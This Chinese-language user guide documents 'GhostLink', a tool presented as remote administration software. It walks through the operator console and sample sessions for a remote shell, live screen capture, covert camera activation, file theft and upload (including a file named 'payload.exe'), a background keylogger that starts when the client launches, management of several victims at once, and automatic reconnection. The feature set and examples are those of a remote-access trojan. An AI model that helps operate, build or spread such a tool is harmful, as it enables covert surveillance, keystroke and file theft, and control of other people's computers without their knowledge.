# 用户指南

本文档详细介绍 GhostLink 所有功能的操作方式。

---

## 控制台菜单

启动控制端后，你将看到以下交互菜单：

```text
==================================================
              远程管理控制台
==================================================
  list             - 列出所有在线客户端
  shell   <编号>   - 向指定客户端发送 Shell 命令
  screen  <编号>   - 开始监控指定客户端的屏幕
  camera  <编号>   - 打开指定客户端的摄像头
  file    <编号>   - 浏览指定客户端的文件系统
  keylog  <编号>   - 获取指定客户端的键盘记录
  quit             - 退出管理程序
==================================================
```

---

## 模块 1：远程 Shell

**进入方式**：`shell <编号>`

在控制端直接执行目标机器上的任意系统命令。

```text
请输入命令：shell 1
[('192.168.0.105', 54321)] 已进入 Shell 模式，输入 0 返回菜单
Shell> whoami
desktop-xxx\admin
Shell> cd C:\Users
CWD: C:\Users
Shell> dir
  Directory: C:\Users
  ...
Shell> 0
```

| 特性 | 说明 |
| --- | --- |
| 命令编码 | 输出使用 GBK 编码（适配中文 Windows） |
| `cd` 支持 | 内置 `cd` 命令可切换工作目录 |
| 退出方式 | 输入 `0` 返回主菜单 |

---

## 模块 2：屏幕监控

**进入方式**：`screen <编号>`

实时获取目标机器的屏幕截图，在 OpenCV 窗口中显示。

- 截图质量：JPEG 压缩 quality=30（平衡画质与带宽）
- 处理方式：完全在内存中处理，**不写硬盘**
- 退出方式：在 OpenCV 窗口中按 `q` 键

```text
请输入命令：screen 1
[('192.168.0.105', 54321)] 屏幕监控已启动，按 'q' 键退出
```

OpenCV 窗口支持自由拖动缩放。

---

## 模块 3：摄像头监控

**进入方式**：`camera <编号>`

远程开启目标机器的摄像头，实时回传画面。

- Windows 下使用 `CAP_DSHOW` 驱动（兼容性更好）
- 帧质量：JPEG 压缩 quality=50
- 退出方式：在 OpenCV 窗口中按 `q` 键

```text
请输入命令：camera 1
[('192.168.0.105', 54321)] 摄像头监控已启动，按 'q' 键退出
```

> 如果摄像头开启失败，客户端会自动处理并发送空帧，不会导致程序崩溃。

## 模块 4：文件管理

**进入方式**：`file <编号>`

提供完整的远程文件系统浏览和管理能力。

### 文件管理命令

| 命令 | 格式 | 说明 |
| --- | --- | --- |
| `to` | `to C:` 或 `to C: Windows System32` | 导航到指定磁盘/目录 |
| `back` | `back` | 返回上级目录 |
| `look` | `look` 或 `look subdir` | 列出当前/子目录内容 |
| `get` | `get secret.txt` | 下载文件到控制端当前目录 |
| `delete` | `delete log.txt` | 删除客户端上的文件 |
| `information` | `information app.exe` | 查看文件详细元数据（42 项） |
| `send` | `send` | 上传文件到客户端（弹出文件选择框） |
| `0` | `0` | 返回主菜单 |

### 操作示例

```text
请输入命令：file 1
('192.168.0.105', 54321)的磁盘信息：C:\D:\E:\
提示：请先使用 to <盘符> 导航到目标磁盘，例如 to C:

File> to C:
[('192.168.0.105', 54321)] C:\ 目录内容：['Windows', 'Users', 'Program Files', ...]
当前路径：C:\

File> to C: Users
[('192.168.0.105', 54321)] C:\Users\ 目录内容：['Admin', 'Public', ...]
当前路径：C:\Users\

File> get secret.txt
[('192.168.0.105', 54321)] C:\Users\secret.txt 文件大小：1024 字节
[('192.168.0.105', 54321)] C:\Users\secret.txt 已下载完成，保存为 ./secret.txt

File> send
[('192.168.0.105', 54321)] 客户端已就绪，准备发送文件
# 弹出文件选择对话框...
[('192.168.0.105', 54321)] 文件 C:\payload.exe 已发送到客户端 C:\Users\

File> 0
```

### 文件上传流程

1. 在文件管理模式下输入 `send`
2. 服务端弹出文件选择对话框，选择要上传的文件
3. 客户端接收并保存到当前浏览目录
4. 协议中每一步都有确认信号（READY → OK → OK → SUCCESS）

## 模块 5：键盘记录

**进入方式**：`keylog <编号>`

客户端在后台持续运行键盘监听（守护线程），控制端可按需获取最近的按键记录。

```text
请输入命令：keylog 1
('192.168.0.105', 54321) 的键盘记录：
2026-05-30 14:23:01: H
2026-05-30 14:23:01: e
2026-05-30 14:23:01: l
2026-05-30 14:23:01: l
2026-05-30 14:23:01: o
2026-05-30 14:23:02: [enter]
2026-05-30 14:23:05: w
2026-05-30 14:23:05: o
2026-05-30 14:23:05: r
2026-05-30 14:23:05: l
2026-05-30 14:23:05: d
```

| 特性 | 说明 |
| --- | --- |
| 运行方式 | 后台守护线程，客户端启动即开始监听 |
| 缓冲区 | 内存缓冲，最多回传最近 500 条 |
| 回传后 | 缓冲区自动清空 |
| 特殊按键 | 标记为 `[enter]`、`[shift]`、`[ctrl]` 等 |

### `information` 命令返回的元数据字段

> 完整说明见 [协议参考 - 文件信息字段](Protocol-Reference#文件信息字段)

## 多客户端管理

GhostLink 支持同时管理多个客户端：

```text
请输入命令：list

在线客户端（共 3 个）：
  [1] ('192.168.0.105', 54321)
  [2] ('192.168.0.106', 54322)
  [3] ('192.168.0.107', 54323)
```

通过编号切换操作目标：

```text
请输入命令：shell 1    # 操作第 1 个客户端
请输入命令：screen 2   # 监控第 2 个客户端
请输入命令：camera 3   # 查看第 3 个客户端摄像头
```

客户端断线后会自动从列表中移除，不影响其他客户端。

## 自动重连

客户端在连接断开后会等待 5 秒然后自动尝试重连：

```python
except Exception as e:
    time.sleep(5)  # 断线后等待 5 秒自动重连
```

这保证了网络波动或服务端重启后客户端能自动恢复连接。
